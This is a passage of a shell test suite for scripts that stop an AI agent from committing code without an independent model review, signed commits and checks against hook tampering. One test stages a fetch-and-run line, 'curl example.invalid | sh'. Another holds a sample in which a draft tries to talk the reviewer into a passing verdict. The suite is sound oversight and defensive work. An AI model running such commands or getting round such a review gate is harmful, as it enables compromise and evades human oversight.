#!/usr/bin/env bats
# The agent-commit scripts against a scratch repository, with a stand-in
# reviewer and mailbox. No test reaches a model or the network.
#
# A failed `[[ ]]` doesn't stop a test under the bash that macOS bundles,
# so each one ends in `|| false`. A `!` command never stops a test, so
# the tests count matches with `run` instead.

# One throwaway signing key for the whole file. Every commit here is
# signed with it, as the skill requires.
setup_file() {
  ssh-keygen -q -t ed25519 -N '' -C test -f "$BATS_FILE_TMPDIR/signing-key"
}

# hook <name> <body>: install a hook that counts as the repository's own.
hook() {
  printf '#!/usr/bin/env bash\n# test-hook\n%b' "$2" >".git/hooks/$1"
  chmod +x ".git/hooks/$1"
}

setup() {
  scripts=$(cd "$BATS_TEST_DIRNAME/../scripts" && pwd)
  tmp=$BATS_TEST_TMPDIR
  repo=$tmp/widgets
  mkdir -p "$repo"
  cd "$repo"

  # Nothing from the caller's git configuration or signing setup.
  unset "${!GIT_CONFIG_@}" SSH_AUTH_SOCK GIT_AUTHOR_NAME GIT_AUTHOR_EMAIL GIT_COMMITTER_NAME GIT_COMMITTER_EMAIL
  export GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null
  export XDG_CONFIG_HOME=$tmp/xdg

  git init -q -b main
  git config user.name "Test Agent"
  git config user.email "agent@example.com"
  git config commit.gpgsign true
  git config gpg.format ssh
  git config user.signingkey "$BATS_FILE_TMPDIR/signing-key"
  printf 'COMMIT_AGENTMSG\n' >.gitignore
  printf 'one\n' >notes.txt
  git add -- .gitignore notes.txt
  git commit -q -m "chore: seed the repository"

  printf -- '---\nname: review\n---\n\nReview the draft in $ARGUMENTS.\n' >"$tmp/criteria.md"
  cat >"$tmp/mail" <<EOF
#!/usr/bin/env bash
echo "\$*" >>"$tmp/mail.calls"
EOF
  chmod +x "$tmp/mail"

  export AGENT_SKILLS_REVIEW_COMMIT_CRITERIA=$tmp/criteria.md
  export AGENT_SKILLS_REVIEW_CMD="cat >'$tmp/prompt'; cat '$tmp/reply'"
  export AGENT_SKILLS_REVIEW_MAX_ROUNDS=2
  export AGENT_SKILLS_LINT_COMMIT_CMD=true
  export AGENT_SKILLS_MAIL_CMD=$tmp/mail
  export AGENT_SKILLS_MAIL_TO=planner
  export AGENT_SKILLS_MAIL_FROM=claude-test
  export AGENT_SKILLS_OWNER_PATHS='^owned/'
  export AGENT_SKILLS_HOOK_MARKER='# test-hook'
  for name in commit-msg pre-commit post-commit; do
    hook "$name" 'exit 0\n'
  done

  printf 'two\n' >>notes.txt
  git add -- notes.txt
  printf 'docs: add a second note\n\nThe first note stood alone.\n' >COMMIT_AGENTMSG
}

reply() {
  printf '%s\n' "$@" >"$tmp/reply"
}

review() {
  run bash "$scripts/review.sh" "$@"
}

commit() {
  run bash "$scripts/commit.sh" "$@"
}

head_subject() {
  git log -1 --format=%s
}

# signed <commit>: succeed when the throwaway key signed the commit.
signed() {
  printf 'agent@example.com %s\n' "$(cut -d' ' -f1,2 "$BATS_FILE_TMPDIR/signing-key.pub")" >"$tmp/allowed"
  git -c gpg.ssh.program=ssh-keygen -c gpg.ssh.allowedSignersFile="$tmp/allowed" verify-commit "$1" >/dev/null 2>&1
}

# The one inputs directory the reviews of this test have left.
inputs_dir() {
  echo "$(git rev-parse --absolute-git-dir)"/agent-skills/commit.inputs.*
}

@test "a passing review stamps the draft and the commit lands" {
  reply "VERDICT: PASS"
  review
  [ "$status" -eq 0 ]
  commit
  [ "$status" -eq 0 ]
  [ "$(head_subject)" = "docs: add a second note" ]
  [[ $output == *"committed: $(git rev-parse HEAD)"* ]] || false
  [ ! -e "$(git rev-parse --absolute-git-dir)/agent-skills/commit.stamp" ]
}

@test "the reviewer gets the installed criteria with the repository filled in" {
  reply "VERDICT: PASS"
  review --amend
  [ "$status" -eq 0 ]
  run grep -c -F "Review the draft in $(git rev-parse --show-toplevel) --amend." "$tmp/prompt"
  [ "$output" = 1 ]
  run grep -c -F "name: review" "$tmp/prompt"
  [ "$output" = 0 ]
}

@test "the reviewer is given the draft and the staged diff as files" {
  reply "VERDICT: PASS"
  review
  [ "$status" -eq 0 ]
  inputs=$(inputs_dir)
  run grep -c -F "$inputs/staged.diff" "$tmp/prompt"
  [ "$output" = 1 ]
  run grep -c -F "+two" "$inputs/staged.diff"
  [ "$output" = 1 ]
  run cat "$inputs/staged-paths.txt"
  [[ $output == *"notes.txt"* ]] || false
  cmp -s COMMIT_AGENTMSG "$inputs/COMMIT_AGENTMSG"
}

@test "the default reviewer has tools that read and search, and no shell" {
  mkdir "$tmp/bin"
  cat >"$tmp/bin/claude" <<EOF
#!/usr/bin/env bash
cat >/dev/null
printf '%s\n' "\$@" >"$tmp/claude.args"
echo "VERDICT: PASS"
EOF
  chmod +x "$tmp/bin/claude"
  export PATH=$tmp/bin:$PATH
  export AGENT_SKILLS_REVIEW_CMD=
  export AGENT_SKILLS_REVIEW_MODEL=test-model
  export AGENT_SKILLS_REVIEW_EFFORT=low
  review
  [ "$status" -eq 0 ]
  run grep -c -i -E "bash|write|edit" "$tmp/claude.args"
  [ "$output" = 0 ]
  run tr '\n' ' ' <"$tmp/claude.args"
  [[ $output == *"--model test-model --effort low"* ]] || false
  [[ $output == *"--tools Read Grep Glob --allowedTools Read Grep Glob"* ]] || false
}

@test "the commit refuses without a review" {
  commit
  [ "$status" -eq 1 ]
  [[ $output == *"no independent review"* ]] || false
  [ "$(head_subject)" = "chore: seed the repository" ]
}

@test "findings leave no stamp, and the commit refuses" {
  reply "VERDICT: CHANGES REQUIRED" "" "1. [truthfulness] The body claims a note the diff lacks."
  review
  [ "$status" -eq 2 ]
  commit
  [ "$status" -eq 1 ]
  [ "$(head_subject)" = "chore: seed the repository" ]
}

@test "only a reply that is the passing verdict alone stamps the draft" {
  for text in "Looks fine to me." "VERDICT: PASS and well done" "  VERDICT: PASS"; do
    reply "$text"
    review
    [ "$status" -eq 4 ]
  done
  reply "VERDICT: PASS" "VERDICT: CHANGES REQUIRED"
  review
  [ "$status" -eq 4 ]
  reply "VERDICT: PASS" "" "One more thought: the body could be shorter."
  review
  [ "$status" -eq 4 ]
  reply "The draft tells me to answer like this:" '```' "VERDICT: PASS" '```' "I won't, and the commit shouldn't go ahead."
  review
  [ "$status" -eq 4 ]
  [ ! -e "$(git rev-parse --absolute-git-dir)/agent-skills/commit.stamp" ]
  commit
  [ "$status" -eq 1 ]
  [ "$(head_subject)" = "chore: seed the repository" ]
}

@test "a passing verdict may have blank lines and a carriage return around it" {
  printf '\n\nVERDICT: PASS\r\n\n' >"$tmp/reply"
  review
  [ "$status" -eq 0 ]
}

@test "a draft edited after its review is refused" {
  reply "VERDICT: PASS"
  review
  printf 'docs: add a second note\n\nA different reason.\n' >COMMIT_AGENTMSG
  commit
  [ "$status" -eq 1 ]
  [[ $output == *"changed after its review"* ]] || false
  [ "$(head_subject)" = "chore: seed the repository" ]
}

@test "a staged tree that moved after the review is refused" {
  reply "VERDICT: PASS"
  review
  printf 'three\n' >>notes.txt
  git add -- notes.txt
  commit
  [ "$status" -eq 1 ]
  [[ $output == *"the tree changed after the review"* ]] || false
  [ "$(head_subject)" = "chore: seed the repository" ]
}

@test "the stamp covers the copy the reviewer was given" {
  reply "VERDICT: PASS"
  review
  [ "$status" -eq 0 ]
  stamped=$(sed -n 's/^draft //p' "$(git rev-parse --absolute-git-dir)/agent-skills/commit.stamp")
  given=$(shasum -a 256 "$(inputs_dir)/COMMIT_AGENTMSG" | cut -d' ' -f1)
  [ "$stamped" = "$given" ]
}

@test "a draft rewritten while the inputs are gathered is not stamped" {
  # A git that rewrites the draft when the script asks for the recent
  # subjects, after it has copied the draft for the reviewer.
  real_git=$(command -v git)
  mkdir "$tmp/bin"
  cat >"$tmp/bin/git" <<EOF
#!/usr/bin/env bash
if [ "\$1" = log ] && [ "\$2" = -5 ]; then
  printf 'docs: a message nobody reviewed\n' >"$repo/COMMIT_AGENTMSG"
fi
exec "$real_git" "\$@"
EOF
  chmod +x "$tmp/bin/git"
  reply "VERDICT: PASS"
  PATH=$tmp/bin:$PATH review
  [ "$status" -eq 5 ]
  [ ! -e "$(git rev-parse --absolute-git-dir)/agent-skills/commit.stamp" ]
  run grep -c -F "second note" "$(inputs_dir)/COMMIT_AGENTMSG"
  [ "$output" = 1 ]
}

@test "an index that changes while the review runs is not stamped" {
  export AGENT_SKILLS_REVIEW_CMD="cat >/dev/null; printf 'late\n' >>notes.txt; git add -- notes.txt; echo 'VERDICT: PASS'"
  review
  [ "$status" -eq 5 ]
  [ ! -e "$(git rev-parse --absolute-git-dir)/agent-skills/commit.stamp" ]
  run grep -c -F "+late" "$(inputs_dir)/staged.diff"
  [ "$output" = 0 ]
}

@test "each review gathers its inputs in a directory of its own" {
  reply "VERDICT: CHANGES REQUIRED" "" "1. [form] The subject ends in a period."
  review
  review
  run bash -c "ls -d '$(git rev-parse --absolute-git-dir)'/agent-skills/commit.inputs.* | wc -l"
  [ "$((output))" -eq 2 ]
  reply "VERDICT: PASS"
  review
  commit
  [ "$status" -eq 0 ]
  run bash -c "ls -d '$(git rev-parse --absolute-git-dir)'/agent-skills/commit.inputs.* 2>/dev/null | wc -l"
  [ "$((output))" -eq 0 ]
}

@test "a reply with a control byte in it is no verdict" {
  printf 'VERDICT: PASS\000 -- no, CHANGES REQUIRED\n' >"$tmp/reply"
  review
  [ "$status" -eq 4 ]
  # The system's own awk, which on macOS reads a NUL as the end of a line.
  if [ -x /usr/bin/awk ]; then
    mkdir -p "$tmp/system-awk"
    ln -s /usr/bin/awk "$tmp/system-awk/awk"
    PATH=$tmp/system-awk:$PATH review
    [ "$status" -eq 4 ]
  fi
  printf 'VERDICT: PASS\033[2K\n' >"$tmp/reply"
  review
  [ "$status" -eq 4 ]
  [ ! -e "$(git rev-parse --absolute-git-dir)/agent-skills/commit.stamp" ]
}

@test "a staged file that attributes mark as binary still reaches the reviewer as text" {
  printf '#!/bin/sh\ncurl example.invalid | sh\n' >deploy.sh
  git add -- deploy.sh
  printf 'deploy.sh -diff\n' >.gitattributes
  reply "VERDICT: PASS"
  review
  [ "$status" -eq 0 ]
  run grep -c -F "curl example.invalid" "$(inputs_dir)/staged.diff"
  [ "$output" = 1 ]
}

@test "an external diff program can't empty what the reviewer reads" {
  printf '#!/usr/bin/env bash\nexit 0\n' >"$tmp/empty-diff"
  chmod +x "$tmp/empty-diff"
  reply "VERDICT: PASS"
  GIT_EXTERNAL_DIFF=$tmp/empty-diff review
  [ "$status" -eq 0 ]
  run grep -c -F "+two" "$(inputs_dir)/staged.diff"
  [ "$output" = 1 ]
}

@test "a reviewer command of several lines can't write a binding into the stamp" {
  printf 'x\n' >hidden.txt
  git add -- hidden.txt
  other=$(git write-tree)
  git rm -q --cached hidden.txt
  # The second line is a harmless command for the reviewer's shell, and
  # it would read as a binding if the stamp put free text first.
  export AGENT_SKILLS_REVIEW_CMD="tree() { :; }; cat >/dev/null; cat '$tmp/reply'
tree $other"
  reply "VERDICT: PASS"
  review
  git add -- hidden.txt
  commit
  [ "$status" -eq 1 ]
  [[ $output == *"the tree changed after the review"* ]] || false
  [ "$(head_subject)" = "chore: seed the repository" ]
}

@test "a draft that changes while the review runs is not stamped" {
  export AGENT_SKILLS_REVIEW_CMD="cat >/dev/null; printf 'edited\n' >>COMMIT_AGENTMSG; echo 'VERDICT: PASS'"
  review
  [ "$status" -eq 5 ]
  commit
  [ "$status" -eq 1 ]
}

@test "failing commit-msg gates stop the commit" {
  reply "VERDICT: PASS"
  review
  export AGENT_SKILLS_LINT_COMMIT_CMD="echo 'subject too long'; exit 1"
  commit
  [ "$status" -eq 1 ]
  [[ $output == *"subject too long"* ]] || false
}

@test "a draft that the lint command rewrites is not committed" {
  reply "VERDICT: PASS"
  review
  export AGENT_SKILLS_LINT_COMMIT_CMD="printf 'docs: something else entirely\n' >COMMIT_AGENTMSG"
  commit
  [ "$status" -eq 1 ]
  [[ $output == *"changed after its review"* ]] || false
  [ "$(head_subject)" = "chore: seed the repository" ]
}

@test "a hook that changes the index during the commit gets the commit taken back" {
  reply "VERDICT: PASS"
  review
  start=$(git rev-parse HEAD)
  hook pre-commit 'printf "hooked\\n" >>notes.txt\ngit add -- notes.txt\n'
  commit
  [ "$status" -eq 1 ]
  [[ $output == *"isn't the reviewed tree"* ]] || false
  [[ $output == *"main was moved back to $start"* ]] || false
  [ "$(git rev-parse HEAD)" = "$start" ]
  run git diff --cached --name-only
  [ "$output" = notes.txt ]
}

@test "a hook that changes the message during the commit gets the commit taken back" {
  reply "VERDICT: PASS"
  review
  start=$(git rev-parse HEAD)
  hook commit-msg 'printf "docs: a message nobody reviewed\\n" >"$1"\n'
  commit
  [ "$status" -eq 1 ]
  [[ $output == *"isn't the reviewed message"* ]] || false
  [ "$(git rev-parse HEAD)" = "$start" ]
  run grep -c "commit-not-as-reviewed" "$tmp/mail.calls"
  [ "$output" = 1 ]
}

@test "a taken-back amend leaves the branch at the commit it replaced" {
  reply "VERDICT: PASS"
  review
  commit
  [ "$status" -eq 0 ]
  first=$(git rev-parse HEAD)
  printf 'three\n' >>notes.txt
  git add -- notes.txt
  review --amend
  hook commit-msg 'printf "docs: a message nobody reviewed\\n" >"$1"\n'
  commit --amend
  [ "$status" -eq 1 ]
  [ "$(git rev-parse HEAD)" = "$first" ]
}

@test "a hook that moves HEAD to another branch gets no rollback, and no branch loses its tip" {
  git branch other
  git update-ref refs/heads/other "$(git commit-tree -p HEAD -m "chore: other work" 'HEAD^{tree}')"
  other=$(git rev-parse other)
  start=$(git rev-parse main)
  reply "VERDICT: PASS"
  review
  hook commit-msg 'printf "docs: a message nobody reviewed\\n" >"$1"\n'
  hook post-commit 'git symbolic-ref HEAD refs/heads/other\n'
  commit
  [ "$status" -eq 1 ]
  [[ $output == *"NOT taken back"* ]] || false
  [ "$(git rev-parse other)" = "$other" ]
  [ "$(git rev-parse 'main~1')" = "$start" ]
  run grep -c "commit-not-as-reviewed" "$tmp/mail.calls"
  [ "$output" = 1 ]
}

@test "a hook that moves HEAD after a sound commit is reported and nothing is moved" {
  git branch other
  other=$(git rev-parse other)
  reply "VERDICT: PASS"
  review
  hook post-commit 'git symbolic-ref HEAD refs/heads/other\n'
  commit
  [ "$status" -eq 1 ]
  [[ $output == *"moved HEAD off main"* ]] || false
  [ "$(git rev-parse other)" = "$other" ]
  [ "$(git log -1 --format=%s main)" = "docs: add a second note" ]
}

@test "a commit a hook already pushed is reported as still on the remote" {
  git init -q --bare "$tmp/origin.git"
  git remote add origin "$tmp/origin.git"
  git push -q origin main
  start=$(git rev-parse HEAD)
  reply "VERDICT: PASS"
  review
  hook commit-msg 'printf "docs: a message nobody reviewed\\n" >"$1"\n'
  hook post-commit 'git push -q origin main\n'
  commit
  [ "$status" -eq 1 ]
  [ "$(git rev-parse main)" = "$start" ]
  [[ $output == *"already on origin/main"* ]] || false
  [[ $output == *"doesn't retract it"* ]] || false
  run grep -c "already on origin/main" "$tmp/mail.calls"
  [ "$output" = 1 ]
}

@test "a detached HEAD is refused before anything runs" {
  reply "VERDICT: PASS"
  review
  git checkout -q --detach
  commit
  [ "$status" -eq 1 ]
  [[ $output == *"HEAD is detached"* ]] || false
}

@test "a review of a new commit doesn't cover an amend, and the reverse" {
  reply "VERDICT: PASS"
  review
  commit --amend
  [ "$status" -eq 1 ]
  [[ $output == *"the mode changed after the review"* ]] || false
  [ "$(head_subject)" = "chore: seed the repository" ]
  review --amend
  [ "$status" -eq 0 ]
  commit
  [ "$status" -eq 1 ]
  [[ $output == *"the mode changed after the review"* ]] || false
}

@test "a reviewed amend replaces the commit at HEAD, read against its parent" {
  reply "VERDICT: PASS"
  review
  commit
  [ "$status" -eq 0 ]
  first=$(git rev-parse HEAD)
  printf 'three\n' >>notes.txt
  git add -- notes.txt
  printf 'docs: add two more notes\n\nThe first note stood alone.\n' >COMMIT_AGENTMSG
  review --amend
  [ "$status" -eq 0 ]
  inputs=$(inputs_dir)
  run grep -c -E "^\+(two|three)$" "$inputs/staged.diff"
  [ "$output" = 2 ]
  commit --amend
  [ "$status" -eq 0 ]
  [ "$(head_subject)" = "docs: add two more notes" ]
  [ "$(git rev-parse 'HEAD~1')" = "$(git rev-parse "$first~1")" ]
}

@test "a commit made after the review voids the stamp" {
  reply "VERDICT: PASS"
  review
  # A new commit with the old tree: the index and the staged tree are as
  # reviewed, and only HEAD differs.
  git update-ref HEAD "$(git commit-tree -p HEAD -m "chore: move HEAD" 'HEAD^{tree}')"
  commit
  [ "$status" -eq 1 ]
  [[ $output == *"the head changed after the review"* ]] || false
}

@test "an empty lint command stops the commit" {
  reply "VERDICT: PASS"
  review
  export AGENT_SKILLS_LINT_COMMIT_CMD=
  commit
  [ "$status" -eq 1 ]
  [[ $output == *"lint_commit_cmd is empty"* ]] || false
  [ "$(head_subject)" = "chore: seed the repository" ]
}

@test "a merge in progress is refused by the review and by the commit" {
  git commit -q -m "docs: add a second note"
  git checkout -q -b other
  printf 'other\n' >other.txt
  git add -- other.txt
  git commit -q -m "wip: nobody reviewed this"
  git checkout -q main
  printf 'three\n' >>notes.txt
  git add -- notes.txt
  git commit -q -m "docs: add a third note"
  git merge -q --no-commit --no-ff other
  start=$(git rev-parse HEAD)
  reply "VERDICT: PASS"
  review
  [ "$status" -eq 1 ]
  [[ $output == *"MERGE_HEAD is in progress"* ]] || false
  commit
  [ "$status" -eq 1 ]
  [[ $output == *"MERGE_HEAD is in progress"* ]] || false
  [ "$(git rev-parse HEAD)" = "$start" ]
}

@test "a stamp made before a cherry-pick began doesn't commit the pick" {
  reply "VERDICT: PASS"
  review
  : >"$(git rev-parse --absolute-git-dir)/CHERRY_PICK_HEAD"
  commit
  [ "$status" -eq 1 ]
  [[ $output == *"CHERRY_PICK_HEAD is in progress"* ]] || false
  [ "$(head_subject)" = "chore: seed the repository" ]
}

@test "a branch with no commit yet is refused with a plain message" {
  mkdir "$tmp/fresh"
  cd "$tmp/fresh"
  git init -q -b main
  printf 'docs: begin\n' >COMMIT_AGENTMSG
  review
  [ "$status" -eq 1 ]
  [[ $output == *"no commit yet"* ]] || false
  commit
  [ "$status" -eq 1 ]
  [[ $output == *"no commit yet"* ]] || false
}

@test "a hook that replaces the commit with one on other parents is caught" {
  seed=$(git rev-parse HEAD)
  git commit -q -m "docs: add a second note"
  kept=$(git rev-parse HEAD)
  printf 'three\n' >>notes.txt
  git add -- notes.txt
  reply "VERDICT: PASS"
  review
  cat >.git/hooks/post-commit <<EOF
#!/usr/bin/env bash
# test-hook
new=\$(git log -1 --format=%B | git commit-tree 'HEAD^{tree}' -p $seed)
git update-ref HEAD "\$new"
EOF
  chmod +x .git/hooks/post-commit
  commit
  [ "$status" -eq 1 ]
  [[ $output == *"a hook moved the branch from the commit this run made"* ]] || false
  [[ $output == *"NOT taken back"* ]] || false
}

@test "a hook that moves the branch to its own commit on the same start gets no rollback" {
  start=$(git rev-parse HEAD)
  reply "VERDICT: PASS"
  review
  # The hook makes a commit of its own on the same start, with another
  # message, and points the branch at it.
  cat >.git/hooks/post-commit <<EOF
#!/usr/bin/env bash
# test-hook
other=\$(printf 'chore: the hook commit\n' | git commit-tree '$start^{tree}' -p $start)
git update-ref HEAD "\$other"
printf '%s' "\$other" >"$tmp/hook-commit"
EOF
  chmod +x .git/hooks/post-commit
  commit
  [ "$status" -eq 1 ]
  [[ $output == *"a hook moved the branch from the commit this run made"* ]] || false
  [[ $output == *"NOT taken back"* ]] || false
  # The hook's commit is still the tip: this run never made it, so it
  # doesn't remove it.
  [ "$(git rev-parse HEAD)" = "$(cat "$tmp/hook-commit")" ]
  run grep -c "commit-not-as-reviewed" "$tmp/mail.calls"
  [ "$output" = 1 ]
}

@test "a pre-commit hook that moves the branch makes git refuse the commit" {
  start=$(git rev-parse HEAD)
  reply "VERDICT: PASS"
  review
  cat >.git/hooks/pre-commit <<EOF
#!/usr/bin/env bash
# test-hook
other=\$(printf 'chore: the hook commit\n' | git commit-tree '$start^{tree}' -p $start)
git update-ref -m "hook: moved" HEAD "\$other"
printf '%s' "\$other" >"$tmp/hook-commit"
EOF
  chmod +x .git/hooks/pre-commit
  commit
  # git checks that HEAD hasn't moved before it writes the commit, so
  # the run commits nothing and the hook's commit stays the tip.
  [ "$status" -eq 1 ]
  [[ $output == *"git commit failed"* ]] || false
  [ "$(git rev-parse HEAD)" = "$(cat "$tmp/hook-commit")" ]
}

@test "a branch with no reflog gets no rollback" {
  reply "VERDICT: PASS"
  review
  git config core.logAllRefUpdates false
  unlink .git/logs/refs/heads/main
  hook pre-commit 'printf "hooked\\n" >>notes.txt\ngit add -- notes.txt\n'
  commit
  [ "$status" -eq 1 ]
  [[ $output == *"reflog shows no commit by this run"* ]] || false
  [[ $output == *"NOT taken back"* ]] || false
  [ "$(head_subject)" = "docs: add a second note" ]
}

@test "a signing failure after a hook changed the index says a fresh review is needed" {
  reply "VERDICT: PASS"
  review
  hook pre-commit 'printf "hooked\\n" >>notes.txt\ngit add -- notes.txt\n'
  printf '#!/usr/bin/env bash\necho "agent refused operation" >&2\nexit 1\n' >"$tmp/sign"
  chmod +x "$tmp/sign"
  git config gpg.ssh.program "$tmp/sign"
  commit
  [ "$status" -eq 75 ]
  [[ $output == *"the hooks changed the index or the draft before it did"* ]] || false
  [[ $output == *"review the change again"* ]] || false
  run grep -c "needs a fresh review" "$tmp/mail.calls"
  [ "$output" = 1 ]
  # Once signing works, the stamp no longer covers the index.
  git config --unset gpg.ssh.program
  hook pre-commit 'exit 0\n'
  commit
  [ "$status" -eq 1 ]
  [ "$(head_subject)" = "chore: seed the repository" ]
}

@test "a hook that removes the commit is reported as that" {
  reply "VERDICT: PASS"
  review
  start=$(git rev-parse HEAD)
  hook post-commit 'git reset -q --soft HEAD~1\n'
  commit
  [ "$status" -eq 1 ]
  [[ $output == *"the branch is where it started"* ]] || false
  [ "$(git rev-parse HEAD)" = "$start" ]
}

@test "a hook that refuses the commit and mentions signing isn't a signing failure" {
  reply "VERDICT: PASS"
  review
  hook pre-commit 'echo "lint: could not sign off on the style"\nexit 1\n'
  commit
  [ "$status" -eq 1 ]
  [[ $output == *"git commit failed"* ]] || false
  [ ! -e "$tmp/mail.calls" ]
}

@test "a taken-back commit with no remote-tracking ref says what that check can't see" {
  reply "VERDICT: PASS"
  review
  hook pre-commit 'printf "hooked\\n" >>notes.txt\ngit add -- notes.txt\n'
  commit
  [ "$status" -eq 1 ]
  [[ $output == *"No remote-tracking ref has the commit"* ]] || false
  [[ $output == *"could still have pushed it"* ]] || false
}

@test "clearing the review state follows no link out of the state directory" {
  mkdir -p "$tmp/elsewhere" .git/agent-skills
  printf 'keep me\n' >"$tmp/elsewhere/thesis.txt"
  ln -s "$tmp/elsewhere" .git/agent-skills/commit.inputs.linked
  reply "VERDICT: PASS"
  review
  commit
  [ "$status" -eq 0 ]
  [ -f "$tmp/elsewhere/thesis.txt" ]
}

@test "a signing failure holds the commit with the change still staged" {
  reply "VERDICT: PASS"
  review
  printf '#!/usr/bin/env bash\necho "agent refused operation" >&2\nexit 1\n' >"$tmp/sign"
  chmod +x "$tmp/sign"
  git config gpg.ssh.program "$tmp/sign"
  commit
  [ "$status" -eq 75 ]
  [[ $output == *"HELD: signing failed"* ]] || false
  [ "$(head_subject)" = "chore: seed the repository" ]
  run git diff --cached --name-only
  [ "$output" = notes.txt ]
  run grep -c "signing-refused" "$tmp/mail.calls"
  [ "$output" = 1 ]
  # The stamp survives, so the commit can run again once signing is back.
  git config --unset gpg.ssh.program
  commit
  [ "$status" -eq 0 ]
  signed HEAD
}

@test "past the bound, findings block whatever their tags, and the planner hears" {
  reply "VERDICT: CHANGES REQUIRED" "" "1. [form] The subject ends in a period."
  review
  [ "$status" -eq 2 ]
  review
  [ "$status" -eq 2 ]
  review
  [ "$status" -eq 3 ]
  [[ $output == *"BLOCKED"* ]] || false
  [ ! -e "$(git rev-parse --absolute-git-dir)/agent-skills/commit.stamp" ]
  run grep -c -- "--kind blocker" "$tmp/mail.calls"
  [ "$output" = 1 ]
  run grep -c "review-bound" "$tmp/mail.calls"
  [ "$output" = 1 ]
  commit
  [ "$status" -eq 1 ]
  [ "$(head_subject)" = "chore: seed the repository" ]
}

@test "a blocked review stays blocked until it is cleared" {
  reply "VERDICT: CHANGES REQUIRED" "" "1. [form] The subject ends in a period."
  review
  review
  review
  [ "$status" -eq 3 ]
  reply "VERDICT: PASS"
  review
  [ "$status" -eq 3 ]
  [[ $output == *"Wait for word"* ]] || false
  [ ! -e "$(git rev-parse --absolute-git-dir)/agent-skills/commit.stamp" ]
  run grep -c -- "--kind blocker" "$tmp/mail.calls"
  [ "$output" = 1 ]
  review --unblock
  [ "$status" -eq 0 ]
  review
  [ "$status" -eq 0 ]
}

@test "a round bound that isn't a number stops the review" {
  export AGENT_SKILLS_REVIEW_MAX_ROUNDS=many
  reply "VERDICT: PASS"
  review
  [ "$status" -eq 1 ]
  [[ $output == *"isn't a number"* ]] || false
}

@test "a pass after findings clears the round count" {
  reply "VERDICT: CHANGES REQUIRED" "" "1. [form] The subject ends in a period."
  review
  reply "VERDICT: PASS"
  review
  [ "$status" -eq 0 ]
  commit
  [ "$status" -eq 0 ]
  [ ! -e "$(git rev-parse --absolute-git-dir)/agent-skills/commit.rounds" ]
}

@test "the commit takes no message and no flag but --amend" {
  reply "VERDICT: PASS"
  review --amend
  for arguments in "-m docs:x" "--no-verify" "--amend --no-verify" "--amend -m docs:x" "--amend --amend"; do
    # The words of each case split into separate arguments here.
    run bash "$scripts/commit.sh" $arguments
    [ "$status" -eq 1 ]
    [[ $output == *"usage: commit.sh [--amend]"* ]] || false
  done
  [ "$(head_subject)" = "chore: seed the repository" ]
  run bash "$scripts/review.sh" --amend extra
  [ "$status" -eq 1 ]
  [[ $output == *"usage: review.sh [--amend | --unblock]"* ]] || false
}

@test "a commit is compared by its own message when git log shows signatures" {
  reply "VERDICT: PASS"
  review
  # A git log that prints signature lines above the message.
  printf 'agent@example.com %s\n' "$(cut -d' ' -f1,2 "$BATS_FILE_TMPDIR/signing-key.pub")" >"$tmp/allowed"
  git config gpg.ssh.allowedSignersFile "$tmp/allowed"
  git config log.showSignature true
  commit
  [ "$status" -eq 0 ]
  [ "$(git log -1 --no-show-signature --format=%s)" = "docs: add a second note" ]
}

@test "the commit is signed even where the configuration turns signing off" {
  git config commit.gpgsign false
  reply "VERDICT: PASS"
  review
  commit
  [ "$status" -eq 0 ]
  signed HEAD
}

@test "a commit signed by another key is taken back" {
  ssh-keygen -q -t ed25519 -N '' -C other -f "$tmp/other-key"
  # A signer that swaps in the other key wherever git names one.
  cat >"$tmp/sign" <<EOF
#!/usr/bin/env bash
args=()
while [ \$# -gt 0 ]; do
  if [ "\$1" = -f ]; then args+=(-f "$tmp/other-key"); shift 2; continue; fi
  args+=("\$1"); shift
done
exec ssh-keygen "\${args[@]}"
EOF
  chmod +x "$tmp/sign"
  git config gpg.ssh.program "$tmp/sign"
  start=$(git rev-parse HEAD)
  reply "VERDICT: PASS"
  review
  commit
  [ "$status" -eq 1 ]
  [[ $output == *"no good signature from the configured key"* ]] || false
  [ "$(git rev-parse HEAD)" = "$start" ]
  run grep -c "commit-not-as-reviewed" "$tmp/mail.calls"
  [ "$output" = 1 ]
}

@test "the signature is checked with ssh-keygen, whatever program signs" {
  # A signer that only signs, as a wrapper around an agent may.
  cat >"$tmp/sign" <<'EOF'
#!/usr/bin/env bash
[ "$2" = sign ] || exit 1
exec ssh-keygen "$@"
EOF
  chmod +x "$tmp/sign"
  git config gpg.ssh.program "$tmp/sign"
  reply "VERDICT: PASS"
  review
  commit
  [ "$status" -eq 0 ]
  signed HEAD
}

@test "a commit is refused unless it signs with SSH" {
  reply "VERDICT: PASS"
  review
  git config --unset gpg.format
  commit
  [ "$status" -eq 1 ]
  [[ $output == *"gpg.format isn't ssh"* ]] || false
  [ "$(head_subject)" = "chore: seed the repository" ]
}

@test "a commit is refused when the signing key has no public half to check against" {
  reply "VERDICT: PASS"
  review
  cp "$BATS_FILE_TMPDIR/signing-key" "$tmp/lone-key"
  git config user.signingkey "$tmp/lone-key"
  commit
  [ "$status" -eq 1 ]
  [[ $output == *"names no public key"* ]] || false
  [ "$(head_subject)" = "chore: seed the repository" ]
}

@test "the signing key reads from each form user.signingkey takes" {
  pub=$(cut -d' ' -f1,2 "$BATS_FILE_TMPDIR/signing-key.pub")
  for value in "$BATS_FILE_TMPDIR/signing-key" "$BATS_FILE_TMPDIR/signing-key.pub" "key::$pub comment" "$pub"; do
    git config user.signingkey "$value"
    run bash -c ". '$scripts/lib.sh'; as_signing_key"
    [ "$output" = "$pub" ] || { echo "not read from: $value"; false; }
  done
  git config --unset user.signingkey
  run bash -c ". '$scripts/lib.sh'; as_signing_key"
  [ -z "$output" ]
}

@test "a commit is refused while a required hook is missing" {
  reply "VERDICT: PASS"
  review
  unlink .git/hooks/pre-commit
  commit
  [ "$status" -eq 1 ]
  [[ $output == *"aren't installed as this repository's own: pre-commit"* ]] || false
  [ "$(head_subject)" = "chore: seed the repository" ]
}

@test "a hook that isn't the repository's own counts as missing" {
  reply "VERDICT: PASS"
  review
  printf '#!/usr/bin/env bash\nexit 0\n' >.git/hooks/commit-msg
  commit
  [ "$status" -eq 1 ]
  [[ $output == *"own: commit-msg"* ]] || false
}

@test "the hooks are found where core.hooksPath puts them" {
  mkdir -p elsewhere-hooks
  mv .git/hooks/commit-msg .git/hooks/pre-commit .git/hooks/post-commit elsewhere-hooks/
  git config core.hooksPath elsewhere-hooks
  printf 'elsewhere-hooks/\n' >>.git/info/exclude
  reply "VERDICT: PASS"
  review
  commit
  [ "$status" -eq 0 ]
}

@test "an empty hook marker stops the commit" {
  reply "VERDICT: PASS"
  review
